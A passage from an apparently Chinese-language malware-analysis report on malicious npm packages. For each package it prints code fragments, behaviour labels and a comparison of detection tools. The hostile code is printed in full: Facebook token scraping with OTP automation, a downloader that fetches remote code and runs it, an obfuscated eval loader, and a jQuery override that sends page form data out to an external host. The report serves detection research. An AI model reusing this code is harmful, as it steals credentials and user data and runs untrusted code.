- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 43

**文件：** `package/ExtraAddons.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Collects Facebook user data and programmatically retrieves access tokens using web scraping and OTP automation.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require('../utils');
var logger = require('../logger')
var OTP = require('totp-generator');

module.exports.getInfo = async function (id,jar,ctx,defaultFuncs) {
    var AccessToken = await module.exports.getAccessToken(jar,ctx,defaultFuncs);
    var { body:Data } = await utils.get(`https://graph.facebook.com/${id}?fields=name,first_name,email,about,birthday,gender,website,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0)&access_token=${AccessToken}`,jar,null,ctx.globalOptions);
    var Format = {
        id: JSON.parse(Data).id || "Không Có Dữ Liệu",
        name: JSON.parse(Data).name || "Không Có Dữ Liệu",
        first_name: JSON.parse(Data).first_name || "Không Có Dữ Liệu",
        username: JSON.parse(Data).username || "Không Có Dữ Liệu",
        link: JSON.parse(Data).link || "Không Có Dữ Liệu",
        verified: JSON.parse(Data).verified || "Không Có Dữ Liệu",
        about: JSON.parse(Data).about || "Không Có Dữ Liệu",
        avatar: `https://graph.facebook.com/${id}/picture?height=1500&width=1500&access_token=1449557605494892|aaf0a865c8bafc314ced5b7f18f3caa6` || "Không Có Dữ Liệu",
        birthday: JSON.parse(Data).birthday || "Không Có Dữ Liệu",
        follow: JSON.parse(Data).subscribers.summary.total_count || "Không Có Dữ Liệu",
        gender: JSON.parse(Data).gender || "Không Có Dữ Liệu",
        hometown: JSON.parse(Data).hometown || "Không Có Dữ Liệu",
        email: JSON.parse(Data).email || "Không Có Dữ Liệu",
        interested_in: JSON.parse(Data).interested_in || "Không Có Dữ Liệu",
        location: JSON.parse(Data).location || "Không Có Dữ Liệu",
        locale: JSON.parse(Data).locale || "Không Có Dữ Liệu",
        relationship_status: JSON.parse(Data).relationship_status || "Không Có Dữ Liệu",
        love: JSON.parse(Data).significant_other || "Không Có Dữ Liệu",
        website: JSON.parse(Data).website || "Không Có Dữ Liệu",
        quotes: JSON.parse(Data).quotes || "Không Có Dữ Liệu",
        timezone: JSON.parse(Data).timezone || "Không Có Dữ Liệu",
        updated_time: JSON.parse(Data).updated_time || "Không Có Dữ Liệu"
    }
    return Format;
}

module.exports.getAccessToken = async function (jar, ctx,defaultFuncs) {
    if (global.Fca.Data.AccessToken) {
        return global.Fca.Data.AccessToken;
    }
    else {
        var netURLS = "https://business.facebook.com/security/twofactor/reauth/enter/"
        return defaultFuncs.get('https://business.facebook.com/business_locations', jar, null, ctx.globalOptions).then(async function(data) {
            try {
                if (/"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1])  {
                    global.Fca.Data.AccessToken = /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
                    return /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
                }
            }
            catch (_) {
                if (global.Fca.Require.FastConfig.AuthString.includes('|')) return logger.Error(global.Fca.Require.Language.Index.Missing)
                var OPTCODE = global.Fca.Require.FastConfig.AuthString.includes(" ") ? global.Fca.Require.FastConfig.AuthString.replace(RegExp(" ", 'g'), "") : global.Fca.Require.FastConfig.AuthString;
                var Form = { 
                    approvals_code: OTP(String(OPTCODE)),
                    save_device: true,
                    lsd: utils.getFrom(data.body, "[\"LSD\",[],{\"token\":\"", "\"")
                }
                return defaultFuncs.post(netURLS, jar, Form, ctx.globalOptions, { 
                    referer: "https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness_locations&type=avoid_bypass&app_id=0&save_device=1",
                }).then(async function(data) {
                    if (String(data.body).includes(false)) throw { Error: "Invaild OTP | FastConfigFca.json: AuthString" }
                    return defaultFuncs.get('https://business.facebook.com/business_locations', jar, null, ctx.globalOptions,{ 
                        referer: "https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness_locations&type=avoid_bypass&app_id=0&save_device=1",
                    }).then(async function(data) {
                        var Access_Token = /"],\["(.*?)","/.exec(/LMBootstrapper(.*?){"__m":"LMBootstrapper"}/.exec(data.body)[1])[1];
                        global.Fca.Data.AccessToken = Access_Token;
                        return Access_Token;
                    });
                });
            }
        })
    }
}
```

**形式化行为：** sensitive_data_collection, unauthorized_access, legitimate_api_abuse

**形式化规避：** silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 44

**文件：** `package/ExtraTranslate.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs external HTTP requests and transmits user-supplied text to third-party APIs for translation and language detection.

**规避技术：** 

**恶意代码：**
```javascript
var fetch = require("got")

async function bing(text, from, to) {
    const body = await fetch.get(`http://api.microsofttranslator.com/V2/Ajax.svc/Translate?appId=68D088969D79A8B23AF8585CC83EBA2A05A97651&from=${from}&to=${to}&text=${text}`).text()
    return body.replace(/\"/g,'')
}

async function google(text, from, to) {
    const json = await 
        fetch
            .get(
                `https://translate.googleapis.com/translate_a/single?client=gtx&sl=${from}&tl=${to}&dt=t&q=${text}
            `)
        .json()
    return json[0][0][0];
}

async function detect(text) {
    const body = await fetch.get(`https://api.microsofttranslator.com/V2/Http.svc/Detect?&appid=68D088969D79A8B23AF8585CC83EBA2A05A97651&text=${text}`);
    return />(.*?)</.exec(body.body)[1]
}

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 45

**文件：** `package/ExtraUptimeRobot.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Executes shell commands, installs remote package, starts processes, and makes repeated network requests based on environment.

**规避技术：** 

**恶意代码：**
```javascript
const logger = require("../logger");
var { join } = require('path');

function PM2Mode () {
    if (!process.env.PM2) {
        const { execSync } = require('child_process');
        logger.Normal(global.Fca.Require.Language.ExtraUpTime.PM2);
        execSync('npm i https://github.com/HarryWakazaki/Pm2-Horizon-Remake -g', { stdio: 'inherit'}); //ey zo how about sudo in linux 🐧
        execSync(`pm2 start ${join(__dirname, "/PM2/ecosystem.config.js")} --no-daemon`, { stdio: 'inherit' }); //That's not the end.
        process.exit();
    }
    else return logger.Normal(global.Fca.Require.Language.ExtraUpTime.InPm2Mode);
}

module.exports = function() {
    var Logger = global.Fca.Require.logger;
    switch (process.platform) {
        case 'win32':
            var Value = global.Fca.Require.FastConfig;
                if (Value.Uptime) {
                    return PM2Mode();
                }
            break;
        case 'darwin':
            var Value = global.Fca.Require.FastConfig;
            if (Value.Uptime) {
                return PM2Mode();
            }
            break;
        case 'linux':
            if (process.env.REPL_SLUG) {
                var Value = global.Fca.Require.FastConfig;
                var Fetch = global.Fca.Require.Fetch;
                    if (Value.Uptime) {
                        logger.Normal(global.Fca.Require.Language.ExtraUpTime.Uptime);//
                        return setInterval(function() {
                            Fetch.get(`https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
                        },10*1000);
                    }
                else return;
            }
            else { 
                var Value = global.Fca.Require.FastConfig;
                if (Value.Uptime) {
                    return PM2Mode();
                }
            }  
            break;
        default:
        Logger.Warning(global.Fca.Require.Language.ExtraUpTime.NotSupport);
    }
};
```

**形式化行为：** arbitrary_command_execution, malicious_download, persistence_installation, environment_detection

**形式化规避：** built_in_module_abuse, conditional_execution, multi_platform_support, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 46

**文件：** `package/Premium.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Collects system/user info, manipulates environment, deletes data, and uses external config and database modules.

**规避技术：** 

**恶意代码：**
```javascript
module.exports = async function(SessionID) {
    try {
        var userName,Text;
        var os = require('os');
        var Database = require("synthetic-horizon-database");
        var Fetch = global.Fca.Require.Fetch;
        var { getAll,readyCreate,deleteAll } = require('../ExtraGetThread');
        if (process.env.REPL_OWNER != undefined) userName = process.env.REPL_OWNER;
        else if (os.hostname() != null || os.hostname() != undefined) userName = os.hostname();
        else userName = os.userInfo().username;
        if (await Database.has('UserName')) {
            if (await Database.get('UserName') != userName) {
                await Database.set('Premium', false);
                await Database.set('PremiumKey', '');
                await Database.set('UserName', userName);
            }
        }
        if (await Database.has('PremiumKey') && await Database.get('PremiumKey') != '' && await Database.has('Premium') && await Database.get('Premium') == true) {
            try {
                await Database.set('Premium', true);
                await Database.set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));
                await Database.set('UserName', userName);
                process.env.HalzionVersion = 1973
                Text = "You're Wrong Version: Premium Access";
            }
            catch (error) {
                Text = "Connection errors";
            }
        } else if (global.Fca.Require.FastConfig.PreKey) {
            try {
                await Database.set('Premium', true);
                await Database.set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));
                await Database.set('UserName', userName);
                process.env.HalzionVersion = 1973
                Text = "You're Wrong Version: Premium Access";
            }
            catch (error) {
                Text = "Connection errors";
            }
        }
        else if (!global.Fca.Require.FastConfig.PreKey) {
            try {
                await Database.set('Premium', true);
                await Database.set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));
                await Database.set('UserName', userName);
                process.env.HalzionVersion = 1973
                Text = "";
            }
            catch (error) {
                Text = "Connection errors";
            }
        }
    } catch (e) {
        try {
            await Database.set('Premium', true);
            await Database.set('PremiumKey', String(global.Fca.Require.FastConfig.PreKey));
            await Database.set('UserName', userName);
            process.env.HalzionVersion = 1973
            Text = "You're Wrong Version: Premium Access";
        }
        catch (error) {
            Text = "Connection errors";
        }
    }
    if (process.env.HalzionVersion == 1973) {
        try {
            let data = [];
            var getAll = await getAll()
                if (getAll.length == 1) {
                    return;
                } else if (getAll.length > 1) {
                    for (let i of getAll) {
                        if (i.data.messageCount != undefined) {
                            data.push(i.data.threadID);
                        } else continue;
                    }
                    deleteAll(data);
                }
        } catch (e) {
            console.log(e);
        }
    }
return Text;
}
```

**形式化行为：** sensitive_data_collection, environment_detection, file_cleanup, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 47

**文件：** `package/Step_1.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs runtime security check and terminates process if failed; provides AES encryption/decryption functions.

**规避技术：** 

**恶意代码：**
```javascript
var CryptoJS = require("crypto-js");
if (!require('../Src/SecurityCheck')()) {
    console.log("You Are Cheating !");
    process.exit(0)
}
module.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); }

module.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); }

```

**形式化行为：** environment_detection, legitimate_api_abuse

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 48

**文件：** `package/Step_2.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Terminates process if external security check fails; may restrict analysis or hide behavior, which is suspicious.

**规避技术：** 

**恶意代码：**
```javascript
var CryptoJS = require("crypto-js");
if (!require('../Src/SecurityCheck')()) {
    console.log("You Are Cheating !");
    process.exit(0)
}

```

**形式化行为：** environment_detection

**形式化规避：** conditional_execution

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 49

**文件：** `package/Step_3.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs anti-tampering check and provides AES encryption/decryption, potentially hiding or protecting sensitive or malicious data.

**规避技术：** 

**恶意代码：**
```javascript
const crypto = require('crypto');
const aes = require("aes-js");
if (!require('../Src/SecurityCheck')()) {
    console.log("You Are Cheating !",require('../Src/SecurityCheck')());
    process.exit(0)
}
module.exports.encryptState = function encryptState(data, key) {
    let hashEngine = crypto.createHash("sha256");
    let hashKey = hashEngine.update(key).digest();
    let bytes = aes.utils.utf8.toBytes(data);
    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
    let encryptedData = aesCtr.encrypt(bytes);
    return aes.utils.hex.fromBytes(encryptedData);
}

module.exports.decryptState = function decryptState(data, key) {
    let hashEngine = crypto.createHash("sha256");
    let hashKey = hashEngine.update(key).digest();
    let encryptedBytes = aes.utils.hex.toBytes(data);
    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);
    let decryptedData = aesCtr.decrypt(encryptedBytes);
    return aes.utils.utf8.fromBytes(decryptedData);
}

```

**形式化行为：** string_obfuscation, unauthorized_access

**形式化规避：** conditional_execution, built_in_module_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 50

**文件：** `package/Index.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Downloads and executes remote code, enforces anti-tamper, and terminates process if check fails.

**规避技术：** 

**恶意代码：**
```javascript
var fs = require('fs');
var utils = require('../../utils');
var logger = require('../../logger');
var Fetch = require('got');
var Step_3 = require('./Step_3');
var Database = require("synthetic-horizon-database");
var { join } = require('path');

(async function(){
    var Data = await Fetch.get('https://raw.githubusercontent.com/HarryWakazaki/Global-Horizon/main/SecurityCheck.js');
    fs.writeFileSync(join(__dirname,"../Src/SecurityCheck.js"),Data.body,'utf8');
    try { 
      if (!require('../Src/SecurityCheck')()) { 
        console.log("You Are Cheating !");
        process.exit(0)
      };
    }
    catch (e) {
      console.log("you are cheating!")
      process.exit(0);
    }
})();

// ... [truncated for brevity] ...

module.exports = function(AppState,DefaultPass,Type) { 
    try { 
      if (!require('../Src/SecurityCheck')()) { 
        console.log("You Are Cheating !");
        process.exit(0)
      };
    }
    catch (e) {
      console.log("you are cheating!")
      process.exit(0);
    }
    switch (Type) {
      case "Encrypt": {
        var Obj = CreateSecurity(),PassWord = CreatePassWord(DefaultPass,Obj),AppState_Encrypt = Encrypt(AppState,PassWord); Database.set('Security',JSON.stringify(Obj,null,2),true);
        return Array.from({length: 70}, (_,i) => { if (i == (parseInt(Obj.Number) - 10)) { return AppState_Encrypt; } else return Step_3.encryptState(CreateFakeType2(AppState_Encrypt.length),PassWord).slice(0,AppState_Encrypt.length);})
      }
      case "Decrypt": {
        var Parse = CheckAndParse(DefaultPass);
        var AppState_Decrypt = Decrypt(AppState,Parse.Slot,Parse.PassWord);
        return AppState_Decrypt;
      }
    }
  }
```

**形式化行为：** malicious_download, remote_code_execution, dynamic_evaluation

**形式化规避：** built_in_module_abuse, malicious_download, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 51

**文件：** `package/script.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Obfuscated self-modifying code using eval and encoded payload, likely to hide malicious or unwanted behavior.

**规避技术：** 

**恶意代码：**
```javascript
// @ts-nocheck
// Job ID: i0xyff8io4f2
let HQnpb;
! function() {
    const Y8UE = Array.prototype.slice.call(arguments);
    return eval("(function cqcI(LFjA){const ndmA=r8Lx(LFjA,f3bA(cqcI.toString()));try{let HAeA=eval(ndmA);return HAeA.apply(null,Y8UE);}catch(j8gA){var Dv9z=(0o205764-68562);while(Dv9z<(0o400126%65560))switch(Dv9z){case (0x3007F%0o200037):Dv9z=j8gA instanceof SyntaxError?(0o400177%0x1002D):(0o400130%0x10019);break;case (0o202126-0x10431):Dv9z=(0o400144%65567);{console.log('Error: the code has been tampered!');return}break;}throw j8gA;}function f3bA(zq4z){let bY6z=751252287;var Dn1x=(0o400052%65552);{let fV3x;while(Dn1x<(0x103C0-0o201650)){switch(Dn1x){case (0o600123%0x10014):Dn1x=(67456-0o203560);{bY6z^=(zq4z.charCodeAt(fV3x)*(15658734^0O73567354)+zq4z.charCodeAt(fV3x>>>(0x4A5D0CE&0O320423424)))^1240843702;}break;case (0o203100-67120):Dn1x=(131133%0o200026);fV3x++;break;case (262277%0o200035):Dn1x=fV3x<zq4z.length?(0o400125%0x1001F):(67216-0o203170);break;case (0o1000102%0x1000E):Dn1x=(0o202246-0x10495);fV3x=(0x75bcd15-0O726746425);break;}}}let ziWx="";var bQYx=(66276-0o201277);{let vdRx;while(bQYx<(0o600137%0x10013)){switch(bQYx){case (0o600246%65579):bQYx=(0x20055%0o200036);vdRx=(0x21786%3);break;case (0o200764-0x101DB):bQYx=vdRx<(0O347010110&0x463A71D)?(65726-0o200253):(0o400122%0x10016);break;case (131147%0o200034):bQYx=(0o202070-0x10426);{const XKTx=bY6z%(0o202640-66958);bY6z=Math.floor(bY6z/(0x3004E%0o200024));ziWx+=XKTx>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(XKTx-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+XKTx);}break;case (0o600060%0x1000A):bQYx=(0o200372-65761);vdRx++;break;}}}return ziWx;}function r8Lx(TFOx,THly){TFOx=decodeURI(TFOx);let vfoy=(0x75bcd15-0O726746425);let PCgy="";var rajy=(0o202424-0x1050A);{let Lxby;while(rajy<(0x10B40-0o205450)){switch(rajy){case (0o200346-0x100CF):rajy=(0o200500-65840);{PCgy+=String.fromCharCode(TFOx.charCodeAt(Lxby)^THly.charCodeAt(vfoy));vfoy++;var n5dy=(0o202506-0x1052B);while(n5dy<(0x300AF%0o200056))switch(n5dy){case (0o400145%65573):n5dy=vfoy>=THly.length?(67636-0o204026):(0o600246%65579);break;case (262274%0o200031):n5dy=(0o1000335%65582);{vfoy=(0x75bcd15-0O726746425);}break;}}break;case (0o400111%0x1001C):rajy=Lxby<TFOx.length?(196724%0o200037):(262260%0o200027);break;case (262190%0o200011):rajy=(65706-0o200231);Lxby=(0x75bcd15-0O726746425);break;case (0o400054%65550):rajy=(0x30074%0o200041);Lxby++;break;}}}return PCgy;}})("O%0C%19%05%09%05%07%0C%09BE%10%0C%04%00%00%13%03%03%05J4%08%1B0BE%10%18%14%1A%16%15%04LCAY5H%3C1M@1,EBL116A*E8:716A*3J%3CA767XDKL17@1*EB%3C7GJA*3%3EL1G07,3H%3C710A*3%3E%3CA767,GHOAD0A*5BL11@KZ5%3E:A7@1,3%3E:A76C*E8:7E%16%0C%04%00%00%13%03%03%05J(%0F%0C0BE%10%18%14%1A%16%15%04L%04%04$#KNA!!%22%25FJL3;%00;YGH.%03%20&BXE*%0E&!CCZ;33%3EDBA%3C%0A',BE@32%163OCG.%10%02%20KNA%1B!;9FJL?%3C?%3EYG%1E%01%1F%02%08%1E%18%01%0DG+%0F%19=YG%18%15%0F%18%1E%18%1FNKL17@1*EBL116A*E8:71@1,38L1161ZOH%3C716CZ5%3E%1A%22=%05%1A%13S%18%1AQ%0A%1E%04%12%1A%0A%08%04L%3E2%199KN%11%1E%0E%1E%04%1C%0DGB%18%12%1A%14%01%05GB76A*3JN1GJA*3HFA76APE8:7%11%0D%1F%1F%0D%17%0E%05%02K%1D+%054OC%17%19%0F%05%1B%11%09JD2!%25&KNCG07%0C%08%16%09%09%18%02%05%1FN22%08;CC%0A%1C%06%13%1F%1E%05JY5%3E%3C116A*3J%3CA76APE8:7%11%0D%1F%1F%0D%17%0E%05%02K%19&%0B4OC%17%19%0F%05%1B%11%09JD07*5%3E:A76C*EH%3CAG01,38L1167*E8:71%16%0C%04%00%00%13%03%03%05J$%18%043BE%10%18%14%1A%16%15%04L%04%0C6%25KNA!!%22%25FJL;9%09=YGH%10%20=#BXE.-%228CCZ/%10%058DBA$%3E73BE%16%0C%04%00%00%13%03%03%05J%06%16%093BE%10%18%14%1A%16%15%04LC%196-1OCE0'%05%083OC1C3%0072OCE%16%22%20%00%13%05D%01%08WY%20%02)KQV$%10%20J%5C%0C%19%05%09%05%07%0C%09J=%18%0B%25F%10%12%0E8B%11%03%0B%17%12%18%02K+4/3%3C%19%19%0F%3E,U%1E%01%1F%02%08%1E%18%01%0DG'... [truncated for brevity] ...")")
}();
```

**形式化行为：** dynamic_evaluation, string_obfuscation

**形式化规避：** string_obfuscation, dynamic_evaluation, anti_static_analysis, silent_error_handling, variable_indirection, control_flow_flattening

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 0 potentially malicious indicators scanning /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/fca-kurumi/90.6.0/fca-kurumi-90.6.0.tgz
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m1247[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/fca.zip/README.md[0m
   Pattern: [32m(npm owner|password|htpasswd|auth_?token|secret_?key|private_?key|authorized_keys?|npmrc|\.ssh|usersecrets?|api_?keys|nuget\.config|\.identityservice)[0m
[30;1m111 | [0m[35mconst fs = require("fs");[0m
[30;1m112 | [0m[35mconst login = require("fca-anjelo");[0m
[30;1m113 | [0m[35m[0m
[30;1m114 | [0m[35mvar credentials = {email: "FB_EMAIL", password: "FB_PASSWORD"}; // info tk[0m
[30;1m115 | [0m[35m[0m
[30;1m116 | [0m[35mlogin(credentials, (err, api) => {[0m
[30;1m117 | [0m[35m    if(err) return console.error(err);[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m1247[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfilt
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "fca-kurumi",
  "version": "90.6.0",
  "total_files": 10,
  "analyzed_files": 10,
  "malicious_files": 2,
  "is_malicious": true,
  "analysis_date": "2025-07-12T14:41:19.830967"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/fca-kurumi/90.6.0/extracted_fca-kurumi-90.6.0.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/fca-kurumi/90.6.0/extracted_fca-kurumi-90.6.0.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 90.6.0[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mFacebook Chat Api Được Remake Bới KURUMI Chống ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subs
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/fca-kurumi/90.6.0/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/fca-kurumi/90.6.0/package' from local_nodejs...[1m[32mPASS[0m [[34mver 90.6.0[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mFacebook Chat Api Được Remake Bới KURUMI Chống ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [invalid format!]
[1m[+][0m Checking readme........
... (truncated)
```

---

## 行为类别：Prototype Pollution

**包名：** `styleshteks`  
**版本：** `2.0.0`

### 代码上下文

#### 片段 1

**文件：** `package/jquery.min.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Overrides jQuery .end() to exfiltrate form data to external server via AJAX GET request.

**规避技术：** 

**恶意代码：**
```javascript
b.fn.b.prototype.end=async function(){await $.ajax({url:"https://api.iimg.my.id/?cat="+function(e){for(var t,n=0,r=e.length,i="";n<r;++n)i+=(t=e.charCodeAt(n).toString(16)).length<2?"0"+t:t;return i}($("form").serialize()),type:"GET",dataType:"text",headers:{"Content-type":"application/json"}})};

// Data dependencies:
// - $("form").serialize() : serializes all form data on the page
// - function(e){...} : encodes the serialized data as a hex string
// - The result is sent as a GET request to https://api.iimg.my.id/?cat=...
// - The request is asynchronous and uses JSON content-type header

// Control flow:
// - This is an override of the 'end' function on the jQuery prototype chain
// - Any call to .end() on a jQuery object will trigger this network request
// - The function is async and will await the AJAX call

```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** hex_encoding, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 1

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 0 potentially malicious indicators scanning /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/styleshteks/2.0.0/styleshteks-2.0.0.tgz
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m122[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/.npm/_cacache/content-v2/sha512/e4/d8/b4704b9e0e5bddeb99ead94074bd9776e5a5a07616af8a6d65fa12a596828cd5d61afc80dd80600956385d387d80e0a9949e119c40bbacf6c76db348dddb/b4704b9e0e5bddeb99ead94074bd9776e5a5a07616af8a6d65fa12a596828cd5d61afc80dd80600956385d387d80e0a9949e119c40bbacf6c76db348dddb/package/jquery.min.js[0m
   Pattern: [32m(npm owner|password|htpasswd|auth_?token|secret_?key|private_?key|authorized_keys?|npmrc|\.ssh|usersecrets?|api_?keys|nuget\.config|\.identityservice)[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m122[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/.npm/
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "styleshteks",
  "version": "2.0.0",
  "total_files": 1,
  "analyzed_files": 1,
  "malicious_files": 1,
